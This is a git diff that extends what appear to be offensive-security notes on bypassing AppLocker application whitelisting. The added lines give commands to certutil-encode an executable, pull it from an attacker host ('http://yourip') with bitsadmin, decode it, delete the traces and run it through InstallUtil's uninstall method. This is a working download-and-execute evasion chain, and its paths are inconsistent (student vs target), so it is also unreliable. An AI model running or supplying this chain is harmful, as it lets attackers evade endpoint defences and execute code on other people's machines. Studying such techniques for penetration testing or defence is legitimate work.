@@ -59,3 +59,14 @@ The above bypass the powershell execution, but if the AppBlocker pervent custom 
 This command allows us to install and uninstall server resources by executing the installer components in a specified assembly. We are going to user uninstall method because install method reuqired admin privileges.
 
 We can write [installer.cs](/06ApplicationWhitelistingBypass/Installer.cs) script and compile to our bypass.exe. Once compiled, we can use native windows commands to transfer our file from attack machine to target machine and exuecte it with InstallUtil command.
+
+First, we can encode our exe on our attack machine, host the encoded file
+
+```
+C:\Users\mst>certutil -encode C:\Users\mst\Bypass.exe file.txt
+```
+
+Second trafer the file to target, decode and execute, and remove encoded file
+```
+C:\Users\target>bitsadmin /Transfer myJob http://yourip/file.txt C:\users\target\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\target\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= LogToConsole=false /U C:\users\target\Bypass.exe
+```
